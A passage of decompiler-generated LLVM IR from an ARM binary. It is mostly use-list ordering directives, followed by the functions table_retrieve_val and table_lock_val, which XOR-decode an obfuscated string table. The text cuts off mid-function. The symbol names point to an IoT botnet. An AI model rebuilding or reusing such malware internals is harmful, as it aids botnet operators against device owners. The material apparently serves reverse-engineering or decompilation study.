  uselistorder i1 %v7_f3a8, { 1, 0 }
  uselistorder i32 %v3_f3a4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_f33c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f33c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f320, { 0, 2, 1 }
  uselistorder i32 %v1_f318, { 1, 0 }
  uselistorder i32 %v1_f2d8, { 2, 1, 0 }
  uselistorder i32 %v1_f2d4, { 1, 0 }
  uselistorder i1 %v2_f2b4, { 1, 0, 2 }
  uselistorder i32 %v0_f2b0, { 1, 0, 2 }
  uselistorder i1 %v7_f27c, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_f27c, { 1, 0, 2 }
  uselistorder i32 %v2_f274, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_f24c, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_f240, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f240, { 0, 2, 1 }
  uselistorder i32 %v3_f300, { 4, 7, 5, 6, 1, 0, 3, 2, 8 }
  uselistorder i32 %v1_f190, { 1, 0 }
  uselistorder i32 %v1_f178, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f184, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f12c, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v5_f120, { 2, 1, 0 }
  uselistorder i32 %v1_f100, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_f0dc, { 1, 0 }
  uselistorder i1 %v9_f0a8, { 1, 0 }
  uselistorder i32* %v2_f028, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_f00c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_eff8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_ef40, { 1, 0 }
  uselistorder i32 %v3_ef30, { 1, 2, 0, 3 }
  uselistorder i1 %v2_ee68, { 1, 0 }
  uselistorder i1 %v2_ee54, { 1, 0 }
  uselistorder i1 %v2_ee40, { 1, 0 }
  uselistorder i32 %.463, { 2, 1, 0 }
  uselistorder i1 %v7_ee1c, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_ee04, { 1, 0 }
  uselistorder i1 %v3_ede8, { 1, 0, 2 }
  uselistorder i1 %v2_edd4, { 1, 0 }
  uselistorder i1 %v2_edb0, { 1, 0 }
  uselistorder i32 %v1_ed60, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ed4c, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_ed48, { 3, 4, 5, 6, 7, 0, 1, 2 }
  uselistorder i32 %stack_var_-1880.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10068, { 2, 3, 1, 0 }
  uselistorder i32 %v2_f5a8, { 1, 2, 3, 0 }
  uselistorder i32 %v2_fd30, { 4, 5, 1, 0, 12, 13, 8, 11, 7, 10, 9, 6, 3, 2 }
  uselistorder i32 %v2_fdd8, { 1, 2, 0 }
  uselistorder i32 %v2_f30c, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_ecf0, { 1, 3, 6, 5, 7, 0, 2, 4, 8, 9 }
  uselistorder i32 %v4_ec54, { 2, 1, 0, 3 }
  uselistorder i16 %v5_ebd8.le, { 1, 0 }
  uselistorder i32 %v0_ebcc, { 2, 1, 0 }
  uselistorder i32 %v2_eb9c, { 3, 2, 0, 1 }
  uselistorder i1 %v7_eb6c, { 1, 0 }
  uselistorder i32 %v3_eb64, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_eb50, { 1, 0 }
  uselistorder i32 %v2_eb34, { 1, 0, 2 }
  uselistorder i32 %storemerge328, { 1, 0 }
  uselistorder i32 %v0_ea8c, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 10, 11, 12, 0, 1, 13, 5, 14, 2, 15, 6, 16, 3, 17, 4, 18, 7, 19, 20, 8, 21, 9, 22 }
  uselistorder i32* %r3.global-to-local, { 108, 62, 63, 64, 65, 66, 67, 68, 69, 70, 109, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 120, 121, 41, 0, 1, 2, 42, 43, 44, 45, 46, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 17, 15, 16, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 166, 71, 72, 73, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 150, 149, 146, 151, 164, 165, 152, 153, 163, 154, 155, 156, 157, 158, 159, 160, 161, 162, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 92, 91, 94, 93, 102, 95, 96, 97, 98, 99, 100, 101, 103, 104, 105, 106, 107 }
  uselistorder i32* %r2.global-to-local, { 77, 78, 35, 36, 37, 38, 39, 40, 41, 42, 43, 79, 80, 81, 82, 27, 44, 0, 1, 28, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 45, 46, 47, 48, 49, 50, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 74, 75, 97, 98, 100, 99, 96, 111, 101, 112, 102, 109, 110, 103, 104, 105, 106, 107, 108, 51, 52, 53, 54, 76, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32* %r1.global-to-local, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 83, 85, 86, 87, 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 98, 36, 37, 38, 39, 40, 41, 81, 82, 51, 52, 53, 54, 55, 56, 57, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 58, 59, 60, 61, 84, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder i32* %ip.global-to-local, { 0, 17, 18, 19, 20, 23, 21, 22, 24, 27, 25, 26, 1, 2, 3, 4, 16, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 212, 241, 188, 30, 116, 51, 53, 199, 200, 117, 118, 85, 86, 87, 88, 89, 1, 124, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 21, 22, 23, 18, 19, 20, 24, 25, 26, 27, 28, 29, 195, 31, 36, 32, 33, 34, 35, 37, 38, 39, 40, 41, 48, 50, 52, 45, 46, 47, 54, 55, 56, 58, 59, 60, 64, 65, 66, 61, 62, 63, 67, 68, 69, 70, 71, 72, 76, 77, 78, 73, 74, 75, 79, 80, 81, 82, 83, 84, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 196, 107, 108, 109, 104, 105, 106, 110, 111, 112, 113, 114, 115, 119, 120, 121, 122, 123, 194, 125, 126, 127, 128, 201, 203, 202, 204, 205, 206, 207, 208, 209, 210, 211, 197, 198, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 225, 227, 228, 226, 223, 224, 49, 44, 42, 229, 43, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 193, 156, 157, 192, 158, 159, 0, 160, 161, 162, 163, 164, 165, 191, 166, 167, 168, 169, 170, 190, 171, 172, 173, 189, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 57, 187 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 212, 0, 187, 31, 114, 115, 199, 53, 47, 200, 116, 86, 87, 88, 89, 2, 195, 4, 5, 6, 12, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 22, 23, 24, 19, 20, 21, 25, 26, 27, 28, 29, 30, 194, 32, 37, 33, 34, 35, 36, 38, 39, 40, 41, 43, 51, 52, 54, 48, 49, 50, 56, 57, 58, 59, 60, 61, 65, 66, 67, 62, 63, 64, 68, 69, 70, 71, 72, 73, 77, 78, 79, 74, 75, 76, 80, 81, 82, 83, 84, 85, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 196, 105, 106, 107, 102, 103, 104, 108, 109, 110, 111, 112, 113, 117, 118, 119, 120, 121, 193, 122, 123, 124, 125, 201, 203, 202, 204, 205, 206, 207, 208, 209, 210, 211, 197, 198, 213, 214, 215, 216, 217, 218, 219, 220, 223, 225, 226, 224, 221, 222, 46, 45, 42, 227, 44, 228, 229, 230, 231, 232, 233, 234, 235, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 192, 154, 155, 1, 156, 157, 191, 158, 159, 160, 161, 162, 163, 190, 164, 165, 166, 167, 168, 189, 169, 170, 171, 188, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 55, 186 }
  uselistorder i32 (i32)* @resolv_entries_free, { 1, 0 }
  uselistorder i16** @global_var_21f80.148, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_21f80.148 to i16*), { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19648.193 to i32), { 5, 7, 2, 8, 6, 9, 3, 10, 0, 11, 1, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 15, 14, 13, 12, 11, 10, 9, 19, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 18, 17, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 10, 11 }
  uselistorder i8 34, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 14, 15, 16, 17, 4, 5, 18, 19, 20, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 16, 17, 18, 19, 4, 5, 6, 7, 20, 21, 22, 23, 8, 9, 10, 11, 12, 13, 14, 15, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 62, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 61, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i32 (i32)* @resolv_lookup, { 1, 0 }
  uselistorder i32 (i32)* @table_lock_val, { 41, 40, 28, 27, 26, 34, 39, 38, 37, 36, 35, 33, 32, 31, 30, 29, 25, 24, 2, 21, 20, 19, 23, 22, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 34, 14, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37 }
  uselistorder i32 (i32)* @table_unlock_val, { 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 3, 17, 16, 15, 19, 18, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 0, 2, 1 }
  uselistorder i32 384, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21f68.160 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 21, 22, 19, 20, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 29, { 0, 4, 1, 2, 3, 6, 5 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_21f75.166, { 1, 0 }
  uselistorder i16* @global_var_21f6a.165, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i32 5888, { 0, 2, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_21f68.160 to i32), { 2, 3, 1, 0, 4, 5 }
  uselistorder i8* @global_var_21f74.161, { 1, 0 }
  uselistorder i8** @global_var_21f54.157, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_21f54.157 to i32), { 0, 7, 1, 6, 2, 5, 4, 3 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 74, 21, 71, 70, 69, 68, 67, 72, 66, 65, 64, 73, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 0, 29, 28, 27, 26, 25, 24, 23, 22, 3, 2, 1, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_24a6c.155, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_24a68.153, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_24a68.153 to i32), { 1, 0, 2, 3, 4 }
  uselistorder i32 356, { 0, 5, 6, 7, 1, 8, 10, 2, 11, 12, 3, 4, 9 }
  uselistorder i32 388, { 2, 3, 6, 0, 1, 4, 5, 7 }
  uselistorder i32* @global_var_21f84.142, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_24a4c.59, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_24a4c.59 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_24a70.140, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10178, { 1, 0 }
  uselistorder label %dec_label_pc_f3f0.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f3f0.backedge.thread564, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_f3f0.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1012c, { 1, 0 }
  uselistorder label %dec_label_pc_1008c, { 1, 0 }
  uselistorder label %dec_label_pc_fe80, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_fe48, { 1, 0 }
  uselistorder label %dec_label_pc_fe34, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fe24, { 1, 0 }
  uselistorder label %dec_label_pc_fd14, { 1, 0 }
  uselistorder label %dec_label_pc_fc48, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fc30, { 1, 0 }
  uselistorder label %dec_label_pc_fb44, { 1, 0 }
  uselistorder label %dec_label_pc_fa88, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fa70, { 1, 0 }
  uselistorder label %dec_label_pc_f95c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f944, { 1, 0 }
  uselistorder label %dec_label_pc_f888, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f870, { 1, 0 }
  uselistorder label %dec_label_pc_f7fc, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f7c8, { 1, 0 }
  uselistorder label %.thread100, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f7a8, { 1, 0 }
  uselistorder label %dec_label_pc_f794, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f750, { 1, 0 }
  uselistorder label %dec_label_pc_f750.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f6e4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f6cc, { 1, 0 }
  uselistorder label %dec_label_pc_f640, { 6, 7, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_f638, { 4, 2, 5, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_f620, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f4fc, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_f4c4, { 1, 0 }
  uselistorder label %dec_label_pc_f458, { 1, 0 }
  uselistorder label %.thread83, { 1, 0 }
  uselistorder label %dec_label_pc_f408, { 1, 0 }
  uselistorder label %dec_label_pc_f3f8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f3f8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_f3ec.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f3d4, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_f2f4, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_f1e4.dec_label_pc_f1e4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f1c0.dec_label_pc_f1c0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f1b4, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_f19c, { 1, 0 }
  uselistorder label %dec_label_pc_f178, { 1, 0 }
  uselistorder label %dec_label_pc_f020, { 10, 0, 1, 2, 8, 9, 3, 4, 5, 6, 7, 11 }
  uselistorder label %dec_label_pc_f00c, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_eea0, { 1, 0 }
  uselistorder label %dec_label_pc_ee94, { 1, 0 }
  uselistorder label %dec_label_pc_ee88, { 1, 0 }
  uselistorder label %dec_label_pc_ee7c, { 1, 0 }
  uselistorder label %dec_label_pc_ee70, { 1, 0 }
  uselistorder label %dec_label_pc_ee5c, { 1, 0 }
  uselistorder label %dec_label_pc_ee48, { 1, 0 }
  uselistorder label %dec_label_pc_ee34, { 1, 0 }
  uselistorder label %dec_label_pc_ee14, { 1, 2, 0 }
  uselistorder label %dec_label_pc_edf0, { 1, 0 }
  uselistorder label %dec_label_pc_ede4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_edc0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ed9c, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_ed48, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_ebcc, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24a78.202 to i32), i32* @r2, align 4
  %v3_10184 = mul i32 %arg1, 8
  %v2_10188 = add i32 %v3_10184, ptrtoint (i32* @global_var_24a78.202 to i32)
  store i32 %v2_10188, i32* @r3, align 4
  %v2_1018c = icmp eq i32* %arg2, null
  br i1 %v2_1018c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_101944 = inttoptr i32 %v2_10188 to i32*
  %v4_101945 = load i32, i32* %v3_101944, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_10190 = add i32 %v3_10184, add (i32 ptrtoint (i32* @global_var_24a78.202 to i32), i32 4)
  %v3_10190 = inttoptr i32 %v2_10190 to i16*
  %v4_10190 = load i16, i16* %v3_10190, align 4
  %v5_10190 = zext i16 %v4_10190 to i32
  store i32 %v5_10190, i32* @r3, align 4
  %v3_10194 = inttoptr i32 %v2_10188 to i32*
  %v4_10194 = load i32, i32* %v3_10194, align 4
  store i32 %v5_10190, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_101946 = phi i32 [ %v4_101945, %.thread ], [ %v4_10194, %bb ]
  ret i32 %v4_101946

; uselistorder directives
  uselistorder i32 %v2_10188, { 1, 0, 2 }
  uselistorder i32 %v3_10184, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_101ac = mul i32 %arg1, 8
  %v2_101b0 = add i32 %v3_101ac, ptrtoint (i32* @global_var_24a78.202 to i32)
  %v2_101b4 = load i32, i32* @global_var_21dc8.205, align 4
  store i32 %v2_101b4, i32* @r1, align 4
  %v1_101b8 = add i32 %v3_101ac, add (i32 ptrtoint (i32* @global_var_24a78.202 to i32), i32 4)
  %v2_101b8 = inttoptr i32 %v1_101b8 to i16*
  %v3_101b8 = load i16, i16* %v2_101b8, align 4
  %v3_101bc = udiv i32 %v2_101b4, 256
  store i32 %v3_101bc, i32* @r2, align 4
  %v2_101c0 = icmp eq i16 %v3_101b8, 0
  store i1 %v2_101c0, i1* @cpsr_z, align 1
  %v3_101c4 = udiv i32 %v2_101b4, 65536
  store i32 %v3_101c4, i32* @r3, align 4
  %v3_101c8 = load i32, i32* @r4, align 4
  store i32 %v3_101c8, i32* %stack_var_-16, align 4
  %v1_101cc = urem i32 %v3_101bc, 256
  store i32 %v1_101cc, i32* %r6.global-to-local, align 4
  %v1_101d0 = urem i32 %v3_101c4, 256
  store i32 %v1_101d0, i32* %r5.global-to-local, align 4
  %v3_101d4 = udiv i32 %v2_101b4, 16777216
  store i32 %v3_101d4, i32* %r4.global-to-local, align 4
  %v1_101d8 = urem i32 %v2_101b4, 256
  store i32 %v1_101d8, i32* %lr.global-to-local, align 4
  br i1 %v2_101c0, label %dec_label_pc_10234, label %dec_label_pc_101e0

dec_label_pc_101e0:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_101e4 = inttoptr i32 %v2_101b0 to i32*
  br label %dec_label_pc_101e4

dec_label_pc_101e4:                               ; preds = %dec_label_pc_101e4.dec_label_pc_101e4_crit_edge, %dec_label_pc_101e0
  %v0_101ec = phi i32 [ %v0_101ec.pre, %dec_label_pc_101e4.dec_label_pc_101e4_crit_edge ], [ %v1_101d8, %dec_label_pc_101e0 ]
  %v2_101f0 = phi i32 [ %v1_10228, %dec_label_pc_101e4.dec_label_pc_101e4_crit_edge ], [ 0, %dec_label_pc_101e0 ]
  %v2_101e4 = load i32, i32* %v1_101e4, align 4
  %v2_101e8 = add i32 %v2_101e4, %v2_101f0
  %v3_101e8 = inttoptr i32 %v2_101e8 to i8*
  %v4_101e8 = load i8, i8* %v3_101e8, align 1
  %v6_101e8 = zext i8 %v4_101e8 to i32
  %v2_101ec = xor i32 %v6_101e8, %v0_101ec
  %v1_101f0 = trunc i32 %v2_101ec to i8
  store i8 %v1_101f0, i8* %v3_101e8, align 1
  %v2_101f4 = load i32, i32* %v1_101e4, align 4
  %v0_101f8 = load i32, i32* @ip, align 4
  %v2_101f8 = add i32 %v0_101f8, %v2_101f4
  %v3_101f8 = inttoptr i32 %v2_101f8 to i8*
  %v4_101f8 = load i8, i8* %v3_101f8, align 1
  %v6_101f8 = zext i8 %v4_101f8 to i32
  %v0_101fc = load i32, i32* %r6.global-to-local, align 4
  %v2_101fc = xor i32 %v0_101fc, %v6_101f8
  %v1_10200 = trunc i32 %v2_101fc to i8
  store i8 %v1_10200, i8* %v3_101f8, align 1
  %v2_10204 = load i32, i32* %v1_101e4, align 4
  %v0_10208 = load i32, i32* @ip, align 4
  %v2_10208 = add i32 %v0_10208, %v2_10204
  %v3_10208 = inttoptr i32 %v2_10208 to i8*
  %v4_10208 = load i8, i8* %v3_10208, align 1
  %v6_10208 = zext i8 %v4_10208 to i32
  %v0_1020c = load i32, i32* %r5.global-to-local, align 4
  %v2_1020c = xor i32 %v0_1020c, %v6_10208
  %v1_10210 = trunc i32 %v2_1020c to i8
  store i8 %v1_10210, i8* %v3_10208, align 1
  %v2_10214 = load i32, i32* %v1_101e4, align 4
  store i32 %v2_10214, i32* @r1, align 4
  %v0_10218 = load i32, i32* @ip, align 4
  %v2_10218 = add i32 %v0_10218, %v2_10214
  %v3_10218 = inttoptr i32 %v2_10218 to i8*
  %v4_10218 = load i8, i8* %v3_10218, align 1
  %v6_10218 = zext i8 %v4_10218 to i32
  %v0_1021c = load i32, i32* %r4.global-to-local, align 4
  %v2_1021c = xor i32 %v0_1021c, %v6_10218
  store i32 %v2_1021c, i32* @r3, align 4
  %v1_10220 = trunc i32 %v2_1021c to i8
  store i8 %v1_10220, i8* %v3_10218, align 1
  %v3_10224 = load i16, i16* %v2_101b8, align 4
  %v4_10224 = zext i16 %v3_10224 to i32
  store i32 %v4_10224, i32* @r2, align 4
  %v0_10228 = load i32, i32* @ip, align 4
  %v1_10228 = add i32 %v0_10228, 1
  store i32 %v1_10228, i32* @ip, align 4
  %v9_1022c = icmp eq i32 %v4_10224, %v1_10228
  store i1 %v9_1022c, i1* @cpsr_z, align 1
  %v8_10230 = icmp sgt i32 %v4_10224, %v1_10228
  br i1 %v8_10230, label %dec_label_pc_101e4.dec_label_pc_101e4_crit_edge, label %dec_label_pc_10234.loopexit

dec_label_pc_101e4.dec_label_pc_101e4_crit_edge:  ; preds = %dec_label_pc_101e4
  %v0_101ec.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_101e4

dec_label_pc_10234.loopexit:                      ; preds = %dec_label_pc_101e4
  %v2_10234.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_10234.loopexit, %entry
  %v2_10234 = phi i32 [ %v2_10234.pre, %dec_label_pc_10234.loopexit ], [ %v3_101c8, %entry ]
